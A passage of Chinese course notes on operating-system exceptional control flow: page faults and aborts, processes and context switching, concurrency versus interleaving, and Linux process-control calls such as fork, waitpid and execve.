PM）到虚拟内存（简称 VM）的映射（还记得 Memory Hierarchy 最后介绍的 TLB cache 吗？就是为这个准备的），<strong>将主存（main memory）上离散的空间映射到连续的虚拟内存空间上</strong>。</p><p>这个 “映射” 存在处理器芯片的 MMU（Memory Managing Unit） 中，这个映射的数据结构被称为 <strong>页表</strong>。为了充分利用主存（物理内存）的空间，页表将 PM 和 VM 切分为很小的块（大家能懂往瓶子里装石子、沙子、水的道理吧？），这些很小的数据块被称为 <strong>页</strong>，而页表就是将这些虚拟内存页映射到物理内存页，如下：</p><p><img src="imgs/page_table.png" height="300px"></p><p>那么这样能同时完成两个目标：</p><ul><li>充分利用有限物理空间，为应用程序提供连续的虚拟空间；</li><li>每个应用程序间的虚拟内存很容易实现隔离（页表数据不同就行，这样哪怕相同的虚拟地址，映射到的物理地址也不同），相互不影响对物理内存的访问。</li></ul><p>每个应用程序所能看到的就是完整的虚拟内存，其中有独立的运行时栈。运行在 CPU 上的应用程序也直接使用虚拟地址，因为 VMA 出 CPU 前会经过 MMU 转换为物理地址，再向硬件请求。</p><p>但是！为了节约空间，操作系统不会一次性将全部的虚拟内存（地址 0 ~ FFFFFFFF）全部用页表映射上物理内存（一来大小不够，二来浪费资源），只是先为虚拟内存的必要部分（例如程序栈的 data 段、code 段、shared libraries 段、stack 段等）分配物理内存、记录在页表上。其余部分被称为<strong>未被分配的段</strong>。这个有 2 种可能：</p><ul><li>应用程序没有权限（执行 kernel space 段，或执行了标记为不可执行的栈区），或这里确实不应该有数据；</li><li>应用程序确实向操作系统申请了大量空间，不过有些还没使用过，OS 自己还<strong>没有</strong>将这段区域通过页表建立与物理内存的映射。</li></ul><p>所以，当程序指令访问上述 2 种段的时候，硬件发现在页表中找不到对应的物理地址，于是发出一个 Synchronous Exception，其类型是 Page Fault。</p><p>如果是因为访问了上面第一种情况的 “未分配的段”，那么在进入 Exception Handler 后，操作系统发现程序确实不应该访问这里，那么操作系统向原进程<strong>发送 SIGSEGV 信号 / SIGGPF 信号（Segmentation Fault 软件信号，或者 Protection Fault 软件信号，前面介绍过，这些信号是另一种 ECF 机制，下下节讨论）</strong>，控制流直接离开原程序（abort），属于 <strong>unrecoverable</strong> 类型；</p><p>如果是因为访问了上面第二种情况的 “未分配的段”，那么操作系统发现是自己没分配，于是在 Exception Handler 中，OS 会将一段新的物理地址分配给虚拟内存，记录在页表中，<strong>回到 $I_{current}$ 的位置</strong>，属于 <strong>recoverable</strong> 类型；</p></blockquote></li><li><p>触发后默认的行为：回到 $I_{current}$（recoverable），或者终止（unrecoverable）；</p></li></ul></li><li><p>Aborts（终止）</p><ul><li><p>触发方法：程序执行了一条神奇的指令，硬件层面严重错误，操作系统对应的 Exception Handler  也没辙，默认行为就是终止程序；</p></li><li><p>例子：<strong>illegal instruction（非法指令，通常因为低特权程序执行了高特权指令，或者压根汇编指令就有问题）、parity error（硬件奇偶校验错误）、machine check（硬件检查未知错误）</strong>；</p><blockquote><p>后两种可能是机器被宇宙射线击中，发生了 bits flop，或者硬件电路出问题了；</p></blockquote></li><li><p>默认行为：<strong>abort（unrecoverable）</strong>；</p></li></ul></li></ol><h3 id="13-3-5-Summary-of-Exception"><a href="#13-3-5-Summary-of-Exception" class="headerlink" title="13.3.5 Summary of Exception"></a>13.3.5 Summary of Exception</h3><p>13.3 中，我们介绍了非常底层级的一种硬件 ECF 机制：Exceptions，请大家回忆：<strong>Exception 的 概念、处理过程、实现方法、种类以及各种类之间的处理模式</strong>。</p><p><img src="imgs/exception_taxonomy.png" height="200px"></p><table>    <tr>        <th>Exception Type</th>        <td>Interrupt</td>        <td>Traps</td>        <td>Faults</td>        <td>Aborts</td>    </tr>    <tr>        <th>Recoverable</th>        <td>✔</td>        <td>✔</td>        <td>Possibly</td>        <td>❌</td>    </tr>    <tr>        <th>Return to</th>        <td>I next</td>        <td>I next</td>        <td>I current / abort</td>        <td>abort</td>    </tr></table><p>这种低层级的控制转移可以由操作系统和硬件联合实现，也是其他高级 ECF 机制的基础。</p><h2 id="13-4-Exception-Control-Flow-Process-Context-Switch"><a href="#13-4-Exception-Control-Flow-Process-Context-Switch" class="headerlink" title="13.4 Exception Control Flow: Process Context Switch"></a>13.4 Exception Control Flow: Process Context Switch</h2><p>要了解进程上下文切换，首先要了解什么是进程。</p><h3 id="13-4-1-Process"><a href="#13-4-1-Process" class="headerlink" title="13.4.1 Process"></a>13.4.1 Process</h3><ul><li><p>定义：一个进程是一个正在运行的程序的实例。</p><blockquote><p>与程序（program）不同，程序可以看作存在于 <code>*.c</code> 文件中的、存在于二进制文件的 <code>.text</code> 区域的、存在于已加载内存的字节中。</p><p>进程是计算机科学中最为影响深远的思想之一。</p></blockquote></li><li><p>进程的 3 种状态：Running、Blocked（Stopped）、Terminated</p></li><li><p><strong>进程提供的 2 个关键抽象</strong>：</p><ol><li><p>Logical Control Flow：</p><ul><li>每个进程都感觉自己独占了 CPU 资源，不用担心寄存器、CPU 的重要数据被更改；</li><li>这种逻辑上的控制流的隔离机制来源于 <strong>OS 内核和硬件提供的重要 ECF —— Process  Contest Switching</strong>；</li></ul><blockquote><p>啥是 Logical Control Flow，在本节结束后你就会知道。</p></blockquote></li><li><p>Private Address Space：</p><ul><li>每个进程都感觉自己独占了主存资源，不用担心别的程序未经同意访问自己的资源；</li><li>这种隔离机制来源于 <strong>OS 和硬件提供的重要抽象：Virtual Memory</strong>（前面说过）；</li></ul></li></ol><p>以上的两个抽象为操作系统提供了<strong>多进程执行与并发（Multiprocessing &amp; Concurrency）的能力</strong>。</p></li><li><p>基于上面 2 条关键抽象，我们的进程满足：</p><ol><li>有整套独立的虚拟内存空间，互不干扰；</li><li>有看起来能够持续执行的 CPU 及稳定的寄存器资源；</li></ol></li></ul><h3 id="13-4-2-How-does-Multiprocessing-work-on-single-processor"><a href="#13-4-2-How-does-Multiprocessing-work-on-single-processor" class="headerlink" title="13.4.2 How does Multiprocessing work on single processor ?"></a>13.4.2 How does Multiprocessing work on single processor ?</h3><p>那么，操作系统是如何同时运行多个进程的呢？我们以仅有一个处理器核为例。</p><p>我们在 13.3.4 中曾经提到过 “系统时钟中断和分时复用”。操作系统想要随时能够取得控制权，就需要<strong>借助硬件时钟，每隔一段时间触发一次时钟中断（interrupt）的 exception，让程序从用户态回到内核态</strong>，由操作系统判断情况，是否要进行一些调度或者切换等处理操作。</p><p>为了充分利用 CPU 等资源，同时运行多个进程，操作系统对每个进程的单次执行时间设置较短（大约 1 ms 量级），<strong>一旦该进程执行时间片耗尽</strong>，那么操作系统会<strong>借助时钟中断的机会</strong>触发一种高级的 ECF: Process Context Switch，将处理器上下文数据切换到另一个进程继续执行。</p><p>这里 “进程的上下文数据” 就是 <strong>能够让系统处理器从其他进程回到当前进程所需额外的数据</strong>。由于每个进程独享一段虚拟内存，所以原本在虚拟内存中的上下文数据无需另外保存。所以，进程的上下文数据一般指 <strong>处理器芯片中的各个寄存器的值、内核数据结构（页表、进程表、文件表等，都放在 kernel space 中）以及各进程虚拟内存总体的物理位置</strong>。</p><p>那么这样也不难理解为什么 OS 和硬件能做到在各个进程之间的无缝切换了。我们小小总结一下：</p><ul><li><p>什么是 Process Context Switch？</p><p>进程上下文切换是指 OS 和硬件 控制处理器保存在当前进程的上下文数据，并切换到另一个进程继续执行的过程。这种交替执行的方式被称为 <strong>interleaving</strong>；</p></li><li><p>为什么需要 Process Context Switch？</p><p>这能够让操作系统利用有限的 CPU 执行多进程任务（multiprocessing），充分利用系统资源，也不至于让一个进程卡死就波及到其他进程的执行。也就是说，<strong>interleaving 可以实现 multiprocessing</strong>；</p></li><li><p>什么时候出现 Process Context Switch？</p><ol><li><strong>（必定）当 Hardware Timer 触发了时钟中断 Exception</strong>；</li><li><strong>（必定）当该进程出现耗时的系统调用时，这种系统调用被称为 “慢系统调用”</strong>（通常是类似 <code>read/write/sleep</code> 的系统调用），哪怕该进程时间片没耗尽，操作系统依然会 suspend 这个进程（进程转为 blocked 状态）；</li><li><strong>（可能）当该进程出现了普通的系统调用</strong>，控制权流转到 OS Kernel 中，操作系统会根据情况（例如优先级等情况，在操作系统课程中的 <code>scheduling</code> 一节介绍）选择是否进行进程上下文切换。</li></ol><blockquote><p>我们发现这三种原因全都是 <strong>Exception</strong>，因此说底层 Hardware ECF 为高级 ECF 提供了基础条件。</p></blockquote></li><li><p>底层的 Process Context Switch 如何实现 / 进行的？</p><p>step 1. 因为上面所述的 3 种原因之一，当前进程执行到某一位置时暂停，并暂时转移到内核态，控制流交给 OS；</p><p>step 2. OS 判断当前是否应该进行 Process Context Switch，如果不是，则退出内核态，恢复原程序执行。不过大部分情况是应该进行切换的，因此进入下一步；</p><p>step 3. 确认要进行进程切换后，操作系统会评估各个进程的<strong>优先级、进程状态等信息</strong>，按照评估结果决定切换到哪个进程上，这个做出决定的内核程序段被称为 <strong>scheduler</strong>；</p><p>step 4. 操作系统在切换前找到原进程的信息，将上下文的处理器中的各个寄存器值存入该进程的虚拟内存中，然后转到 scheduled process 中，从 scheduled process 的虚拟内存中读出处理器的上下文数据，继续执行 scheduled process，过程如下：</p><p><img src="imgs/context_switch.png" height="200px"></p></li><li><p>在 Context Switch 中需要注意的是：</p><ul><li>OS Kernel 并不是一个单独的进程，OS Kernel 的数据存在于每个进程中，作为它们的一部分。通常数据位于各进程虚拟内存 <strong>栈区的下层（用户态不可访问）</strong>；</li></ul></li></ul><h3 id="13-4-3-Concurrency-amp-Parallelism-amp-Interleaving"><a href="#13-4-3-Concurrency-amp-Parallelism-amp-Interleaving" class="headerlink" title="13.4.3 Concurrency &amp; Parallelism &amp; Interleaving"></a>13.4.3 Concurrency &amp; Parallelism &amp; Interleaving</h3><p>之前我们讨论的实现 multiprocessing 的方式是 interleaving，而计算机科学中还有两个概念叫 <strong>并发（concurrency）和 并行（parallelism）</strong>，它们之间的关系是什么？我们来对比一下：</p><ul><li>并发：指<strong>在一个较短的时间内同时执行多条任务或进程</strong>，它是一种<strong>执行策略</strong>，我们可以由多种方案来实现这个策略；</li><li>交织（interleaving）：指<strong>交替（在时间上 sequential）执行多条任务或进程，但 “appeals to”（看起来像是）同时在执行所有任务</strong>，这个名词通常被用作多任务或分时复用的系统中，表明<strong>处理器短时间内在不同任务间切换以达到同时执行的效果</strong>。</li><li>并行：指<strong>严格同时地执行多条任务或进程</strong>，主要的目标是利用<strong>多核 / 多处理器</strong>共同工作的杠杆作用来同时地执行任务，提升系统性能；</li></ul><p>我们将上面的概念解析成几个容易理解的观点：</p><ol><li>并发是一个很广的概念，它可以通过多种机制实现，比如 并行（simultaneous execution）、交织（sequential execution with rapid switching），所以说 <strong>并行和交织都是实现并发的途径</strong>；</li><li>交织则强调在一个处理器上，充分利用有限资源执行多个任务，而并行则强调在多个处理器相互协作，同时处理不同的任务，达到 1+1 &gt; 2 的效果；</li></ol><p>可能还有同学会问，那多进程（multiprocessing）和它们又有啥关系？</p><p>实际上，我们上面讨论的都是抽象层面的策略和方案，它们可以针对计算机系统中的进程，也可以针对其他的任务。所以<strong>并发、并行、交织都是实现多进程的思路之一</strong>。</p><h3 id="13-4-4-Concurrent-Process"><a href="#13-4-4-Concurrent-Process" class="headerlink" title="13.4.4 Concurrent Process"></a>13.4.4 Concurrent Process</h3><p>理解了并行、并发、交织的概念后，我们再来看<strong>进程的并发</strong>。进程的并发有以下重要的概念：</p><p>首先我们在 16.1 中介绍过，物理控制流（大家回忆一下）是指硬件上正在执行的实际指令序列。现在，我们将每一个进程都看作一个 <strong>Logical Control Flow</strong>（逻辑控制流），所谓逻辑控制流就是<strong>从这个进程的开始到最终 terminated 的全过程</strong>（包括中间 blocked 的部分）。画一对图大家就理解了：</p><p><img src="imgs/physical_control_flow.png" height="200px"></p><p>如上图，假设在一个处理器上，进程 A、B、C 的物理控制流如图所示。我们可以看到这采取了一种多进程交替执行的方式实现了进程的并发。所以它所对应的逻辑控制流是：</p><p><img src="imgs/logical_control_flow.png" height="200px"></p><p>我们可以形象地理解，进程逻辑控制流就是将它的物理控制流从头至尾连接起来。</p><blockquote><p>注意：如果 <code>graph 2</code> 是物理控制流，那么这个行为就是多核并行了。</p></blockquote><p>在这个基础上，我们做出如下定义：</p><ul><li>如果两个进程的逻辑控制流在时间上相互重叠（overlap in time），那么称这两个进程是<strong>并发执行</strong>（concurrently）的；</li><li>否则称这两个进程是<strong>顺序执行</strong>（sequentially）的；</li></ul><h3 id="13-4-5-Process-Control"><a href="#13-4-5-Process-Control" class="headerlink" title="13.4.5 Process Control"></a>13.4.5 Process Control</h3><p>在了解很多进程的理论后，我们需要转向实践层面的学习。现代 Linux 系统提供了很多控制进程的<strong>系统级函数</strong>（C library 中包装的系统调用接口），这些函数操作进程的过程称为 “<strong>进程控制</strong>”，而这些<strong>系统级函数最终大多数都会进行系统调用</strong>。</p><p>以 x86-64 Linux 为例，大多数系统函数的规范是：</p><ul><li><p>如果执行出错，则返回 <strong>-1</strong>，同时设定全局宏 <code>errno</code> 来提示出错的原因。</p><blockquote><p>因此在使用系统级函数时，有一个约定俗成的硬性规定（hard and fast rule）：<strong>当调用系统级函数后，必须检查其返回值，已确认其是否正确执行</strong>。</p><p>某些特别的系统级函数除外，例如 <code>exit</code>、<code>free</code> 返回 <code>void</code> 类型；</p></blockquote></li></ul><p>首先遇到的第一个进程控制的系统级函数，用于<strong>复制 / 创建进程</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pid_t</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><ul><li><p>作用：复制一个与当前进程一模一样的进程。复制出的进程被称为原进程的<strong>子进程</strong>，父进程的含义不解释。</p></li><li><p><strong>注意，一模一样是进程的虚拟内存中的几乎所有数据都一致，但父进程和子进程虚拟内存相互独立（相当于 deep copy）</strong>；</p><ul><li>虚拟地址、进程总体程序栈数据都一样；</li><li>文件标识符直接可以继承使用，也就是可以访问任何父进程已打开的文件；</li><li>父、子进程间 PID、页表等信息不一致；</li></ul></li><li><p>返回值：<strong>在父、子进程中分别返回一次。</strong></p><ul><li>当创建进程失败后，返回 -1；</li><li>当进程创建成功，且当前进程为父进程时，返回<strong>子进程的 PID（正整数）</strong>；</li><li>当进程创建成功，且当前进程为子进程时，返回 <strong>0</strong>；</li></ul></li><li><p>⚠ 使用提示：</p><ol><li><p>此方法创建的新进程与原进程的<strong>运行的顺序和同步性完全不能保证</strong>（即在逻辑控制流中没有明确先后关系）。因此输出时序具有随机性，在编程时不应该假设二者的执行顺序；</p></li><li><p>适宜使用<strong>树状拓扑图的结构</strong>（这被称为 <strong>进程图，process graph</strong>）分析存在多个 fork 进程控制的情况；</p><blockquote><p><strong>进程图的使用方法</strong></p><p>一个进程图是分析<strong>并发程序</strong>的语句<strong>部分执行顺序</strong>的有力工具。</p><ul><li>进程图是一个有向无环图（DAG，没有自环、重边），图的每个顶点代表每条语句的执行情况；</li><li><code>a -&gt; b</code> 表示 a 语句发生在 b 语句之前，二者<strong>在逻辑控制流上有明确先后关系</strong>；</li><li>进程图的<strong>边</strong>可以标注当前情况下<strong>变量的值</strong>；</li><li>进程图的<strong>点</strong>可以标注当前语句的<strong>输出或其他信息</strong>；</li><li>进程图的<strong>任意一种拓扑排序与一种可能的执行顺序</strong><u><strong>一一对应</strong></u>（所有拓扑排序则代表所有所有可能的执行顺序）；</li></ul><p>这里一个常见考题：给出一个含有很多 <code>fork()</code> 的程序，要求写出输出情况；</p></blockquote></li></ol></li></ul><p>其次，我们还可以<strong>获取进程号（PID）</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pid_t</span> <span class="title function_">getpid</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">getppid</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><ul><li>二者作用：获取当前进程 / 获取父进程 PID；</li><li>返回值：当前进程 / 父进程 PID；</li></ul><p>系统级函数还可以<strong>终止一个进程</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> status)</span>;</span><br></pre></td></tr></table></figure><ul><li>作用：以 <code>status</code> 状态数终止这个进程；</li><li>约定：<code>status</code> 状态数 0 表示正常退出，非零代表异常退出；</li><li>返回值：不返回任何值，一个进程只会执行一次；</li></ul><p>系统级函数还可以<strong>让一个进程主动进入 stopped 状态并持续一段时间</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sleep</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> secs)</span>;    <span class="comment">/* in &lt;unistd.h&gt; */</span></span><br></pre></td></tr></table></figure><ul><li>作用：让当前进程进入 stopped 状态 suspend 起来，不接受 OS 调度，直到 <code>sec</code> 秒后恢复 running 状态；</li><li>返回值：进程实际<strong>还剩多少秒没有 sleep</strong>（因为中途可能会被信号等 ECF 机制打断）；</li></ul><p>系统级函数也可以<strong>让一个进程无限期进入 stopped 状态，直到向其传入任意信号</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pause</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><ul><li>作用：当前进程进行系统调用，直接进入 stopped 状态；</li><li>返回值：如果控制流能回来，那么总是返回 -1；</li></ul><hr><p>此外，系统函数还提供了 <strong>回收子进程（Reaping Child Process）</strong> 的能力。</p><p>为了了解这是什么意思，我们有必要 recap 一下在 16.4.1 中介绍的 Process 的概念。从编程人员的角度来看，一个进程具有 3 种状态（运行、阻塞 和 终止）。现在我们结合之前了解到的 Process Context Switch 和进程调度的基础知识，再重新认识一下这 3 种状态：</p><ul><li><p>Running：处于该状态的进程<strong>可能正在被执行</strong>，<strong>也可能是退出了阻塞状态，等待被 OS 调度执行</strong>；</p></li><li><p>Stopped：处于该状态的进程<strong>已挂起（suspended），并且无法被 OS 调度，除非有信号通知</strong>；</p></li><li><p>Terminated：处于该状态的进程<strong>已经永久结束运行</strong>；</p><blockquote><p>进程终止的 3 点原因：</p><ol><li>收到一个<strong>默认行为是终止进程的信号</strong>；</li><li><code>main</code> 流程执行完毕；</li><li>进程种的程序主动调用 <code>exit</code> 函数；</li></ol></blockquote></li></ul><p>我们发现，改变进程状态的方法是<strong>操作系统与应用程序间的</strong>高级 ECF：<strong>信号</strong>；而信号的发出又需要 硬件 ECF（Exception）作为条件。</p><blockquote><p>下一节会提及高级 ECF 信号的机制，举个例子，Ctrl + C -&gt; Interrupt Exception -&gt; Kernel 发出 SIGINT -&gt; 信号提醒进程进行默认行为）。</p></blockquote><p>除此之外，我们还看到，进程的状态中有一个是 terminated，这说明<strong>操作系统在一个进程终止后，会一直保存这个进程的状态和部分数据（包括退出状态、多种 OS 表），直到它被 “回收（reaped）”</strong>。那么为什么进程结束了还需要等待回收？为何不直接清除这个进程的数据？</p><p>这是因为，我们通常需要知道<strong>进程退出的一些状态信息（正常退出，还是因为其他原因退出）</strong>，如果 OS 在进程结束后就直接清除数据，那么我们无从知晓其中的信息。</p><p>通常情况下，在一个进程从永久退出执行，直到被回收的时间段内，我们将这个进程称为 <strong>zombie</strong>（僵尸进程，在 <code>ps</code> 命令下显示 <code>&lt;defunct&gt;</code>）。</p><p>那么进程最终应该由谁回收？答案是<strong>父进程或者是系统根进程 <code>init</code> (PID = 1)</strong>。父进程如果想要等待在子进程退出后获取子进程的退出状态，那么就需要使用系统级函数 <code>wait</code> 和 <code>waitpid</code>。准确地说，它们并不是 wait 进程结束，而是 wait 进程状态的改变；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pid_t</span> <span class="title function_">wait</span><span class="params">(<span class="type">int</span> *child_status)</span>;    <span class="comment">/* Equivalent to waitpid(-1, &amp;s, 0); */</span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">waitpid</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span>* child_status, <span class="type">int</span> options)</span>;</span><br></pre></td></tr></table></figure><p>由于 <code>wait</code> 是对 <code>waitpid</code> 的默认包装，因此我们这里仅介绍 <code>waitpid</code>；</p><ul><li><p>第一参数 <code>pid</code> 指定父进程要等待的子进程的 PID；如果传入 <strong>-1</strong>，则表示<strong>等待任意一个子进程状态改变即返回</strong>；如果传入 <strong>0</strong>，则表示<strong>等待任意一个与调用进程同进程组的子进程状态改变即返回</strong>；</p><blockquote><p>“状态改变”，而不是永久终止（terminated）。</p></blockquote></li><li><p>第二参数 <code>child_status</code> 应该传入一个整型地址，函数返回时会将子进程的状态码（<strong>和退出码不一样，需要专门的宏进行读取</strong>）填写进去；如果传入 <strong>NULL</strong>，则表示不关心子进程的状态，只是等待指定的子进程状态改变；</p><blockquote><p>读取该参数的宏位于 <code>&lt;sys/wait.h&gt;</code> 头文件中：</p><p><code>WIFEXITED(child_status)</code>：返回子进程是否被正常终止（调用了 <code>_exit(2)/exit(3)</code> 或从 <code>main</code> 返回）；</p><p><code>WEXITSTATUS(child_status)</code>：返回子进程的退出状态（当且仅当 <code>WIFEXISTED</code> 为真的时候有效）；</p><p><code>WIFSIGNALED(child_status)</code>：返回子进程是否被信号终止；</p><p><code>WTERMSIG(child_status)</code>：返回终止子进程信号的编号（当且仅当 <code>WIFSIGNALED(child_status)</code> 为真时有效）；</p><p>还有 <code>WCOREDUMP(child_status)</code>、<code>WIFSTOPPED(child_status)</code>、<code>WSTOPSIG(child_status)</code>、<code>WIFCONTINUED(child_status)</code> 等，大家可以用到再查；</p></blockquote></li><li><p>第三参数 <code>options</code> 常用的参数有 4 个，可以由按位或运算符连接：</p><ul><li><p>0：指定 <code>waitpid</code> 函数<strong>阻塞</strong>，直到子进程状态改变、获取信息后才返回；</p></li><li><p><code>WNOHANG</code>：指定 <code>waitpid</code> 函数<strong>非阻塞</strong>，如果子进程状态还没改变，那么立即返回；</p></li><li><p><code>WUNTRACED</code>：指定 <code>waitpid</code> 在子进程<strong>不是因为 <code>ptrace</code> 而进入 stopped 状态时</strong>也直接返回；</p><blockquote><p>什么是 <code>ptrace</code> ?</p><p><code>ptrace</code> 是 Linux 的<strong>另一个系统调用</strong>，为一个进程提供了<strong>观察</strong>和<strong>控制</strong>另一个进程的执行过程的能力，同时也提供<strong>检查</strong>和<strong>改变</strong>另一个进程的内存值以及相关寄存器信息。</p><p>大名鼎鼎的 <code>gdb</code> 和系统工具 <code>strace</code> 都是基于 <code>ptrace</code> 完成调试工作 和 逆向工程的。</p><p>这里的 <code>ptrace</code> 的系统级函数签名如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span>       </span></span><br><span class="line"><span class="type">long</span> <span class="title function_">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid, <span class="type">void</span> *addr, <span class="type">void</span> *data)</span>;</span><br></pre></td></tr></table></figure><p>事实上，当 <code>ptrace</code> 被调用来 attach 一个进程时，首先进入 syscall（Exception），操作系统在 exception handler 中的默认行为是通过<strong>信号</strong>沟通 <code>ptrace</code> 所在进程 和 attach 的进程，最后该进程会进入 <strong><code>Traced</code> 状态</strong>（一个与 Stopped 状态几乎相同的状态，都是暂时中止进程执行和调度），等待 <code>ptrace</code> 所在进程的调试工作。</p></blockquote></li><li><p><code>WCONTINUED</code>：指定 <code>waitpid</code> 在子进程接受到信号 <code>SIGCONT</code> 而从 stopped 状态恢复为 running 状态时，也直接返回；</p></li></ul></li><li><p>返回值：如果成功执行，则返回状态改变的子进程 PID（<strong>如果指定了 <code>WNOHANG</code>，并且指定的子进程存在，但是子进程还没改变状态，那么直接返回 0</strong>）；如果执行错误，那么返回 -1，错误码位于 <code>errno</code>；</p></li></ul><p>这两个函数不仅可以查看子进程的退出状态，而且也告诉操作系统，“如果子进程结束，则可以直接回收该进程了”。</p><blockquote><p>测试发现，如果 <code>waitpid</code> 是<strong>非阻塞</strong>的话，子进程结束仍然不能直接被回收。</p></blockquote><p>如果父进程不想了解子进程的退出情况（<strong>没有调用上述两个函数</strong>），或者<strong>在子进程结束前就退出了（那么这时，子进程被称为孤儿进程，orphaned child process）</strong>，那么操作系统<strong>会自动将回收权交给 <code>init</code> 根进程，等待孤儿进程结束后直接回收</strong>。</p><p>这种回收的流程可以总结为：</p><p><img src="imgs/reap_process.png"></p><blockquote><p>⚠ 一种可能的内存泄漏的情形：</p><p>在一个长期运行的服务器上，系统可能运行了大量的进程。对于一些服务程序，<code>init</code> 根进程不会回收这些 zombie 进程，因为服务器是长期运行的，也等不到父进程结束的情况。如果父进程不显式回收子进程，那么会导致 zombie 进程堆积，内存溢出，甚至内核崩溃。</p></blockquote><p>⚠ <strong>另外，还有一个要点，即 <code>waitpid</code> 只能等待父进程的直接子进程（immediate child process），它无法等待子进程的子进程的结束并返回信息的</strong>。</p><hr><p>最后，系统级函数还提供了<strong>更改当前进程运行的程序</strong>的功能（毕竟之前只提供了 <code>fork()</code> 通过复制创建进程）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> _Nullable argv[],</span></span><br><span class="line"><span class="params">           <span class="type">char</span> *<span class="type">const</span> _Nullable envp[])</span>;</span><br></pre></td></tr></table></figure><p>这条系统级函数也是系统调用的接口，可以在<strong>当前进程中加载并运行指定程序</strong>。</p><ul><li><p>第一参数 <code>pathname</code>：可执行文件名，它可以是二进制文件，也可以是由 <code>#!interpreter</code> 开头的脚本（Linux 约定俗成，在脚本文件前注释解释器名，例如 <code>#!/bin/bash</code>）；</p></li><li><p>第二、参数 <code>argv[]</code> 和 <code>envp[]</code> 分别是参数列表和环境变量列表，可以为空；</p><p><code>envp</code> 的设置就是简单字符串：<code>&quot;&lt;name&gt;=&lt;value&gt; ...&quot;</code>，或者使用 <code>getenv</code>、<code>putenv</code>、<code>printenv</code> 进行解析和设置环境变量字符串；</p><blockquote><p>注：<code>envp[]</code> 会在执行前由 OS append 几个参数，参数就是系统环境变量；</p></blockquote></li><li><p>返回值：<strong>仅在执行错误（找不到指定文件）时返回 -1</strong>；</p></li></ul><p>⚠ 注意，在当前进程运行该指令后，<strong>如果正确执行，那么程序控制流永远不会回到该指令的下一行，程序整体会在虚拟内存中完全被替换为新运行的程序，即完全覆盖当前程序虚拟空间，包括 code 区、data 区、stack 区等等</strong>，仅保留 PID、file descriptor 和 signal context（信号上下文）。</p><p>这意味着，正确执行的情况下，<strong><code>execve</code> 不会有返回值</strong>。</p><p>这还意味着，如果你想开发一个 Linux shell，那么你使用 <code>execve</code> 时，应该 <code>fork</code> 一个子进程出来，然后在子进程中执行该命令。否则当前程序会被覆盖。</p><p>当新的程序被从可执行文件加载到虚拟内存后，程序的虚拟内存的结构应该是这样（不包括 kernel space）：</p><p><img src="imgs/new_user_stack.png" height="350px"></p><blockquote><p>有同学可能会问，为啥不做一个<strong>同时创建一个进程并运行指定程序的系统调用呢？</strong>实际上，设计者从实用性和冗余性两个方面考虑，<code>fork</code> 非常有用，例如对于一个并发服务器而言，想要创建多个副本来响应 client，那么只需要 fork 就行；</p><p>而且你可以在运行指定程序前、fork 之后的时间内可以做一些其他自定义的准备工作，非常灵活。</p></blockquote><h3 id="13-4-6-Summary-of-Process-amp-Process-Control"><a href="#13-4-6-Summary-of-Process-amp-Process-Control" class="headerlink" title="13.4.6 Summary of Process &amp; Process Control"></a>13.4.6 Summary of Process &amp; Process Control</h3><p>在本节中，我们学习了一种高级的 ECF 机制：Process Context Switch。为了深入讨论这个话题，我们首先了解了进程的概念（一个正在运行的程序的实例），以及进程重要的 2 个抽象——对 CPU（logical control flow 是连续的）和 主存（private address space 是独享的）的抽象。</p><p>另外，我们从 “系统如何充分利用有限资源实现多进程并发” 的问题入手，了解了当今 Linux 操作系统<strong>利用 Timer Interrupt Exception</strong>（分时复用和时间片轮转）<strong>和 系统调用</strong> 达到 Process Context Switch 的目的，进而实现多进程执行的 interleaving。于是 进程上下文切换的 <strong>What、Why、When、How</strong> 四个问题都得到了解答。</p><p>其中，我们还详细比较了 interleaving、parallelism、concurrency、multiprocessing 的概念的异同，分析了怎么看 Physical Control Flow、怎么画 Logical Control Flow、怎么判断进程是 concurrent 还是 sequential 执行的。</p><p>最后一部分，在实际编程层面，我们介绍了控制 process 的、包装了系统调用的<strong>系统级函数</strong>，它们分别有：<code>fork</code>、<code>getpid</code>、<code>getppid</code>、<code>exit</code>、<code>sleep</code>、<code>waitpid(wait)</code>、<code>execve</code>。我们重点分析了这些函数的参数、返回值的含义，以及调用时的注意事项和技巧。</p><p>例如分析多重 <code>fork</code> 的进程图，<code>fork</code> 和 <code>execve</code> 的独特返回方式，<code>waitpid</code> 的复杂参数，最重要的点之一还是 “<strong>为什么要有进程回收、怎么进行进程回收</strong>” 的问题。</p><p>不过，我们在这节多次提到信号的概念，足以说明信号在操作系统与应用程序间的 ECF 的重要性。下节我们就讨论高级 ECF 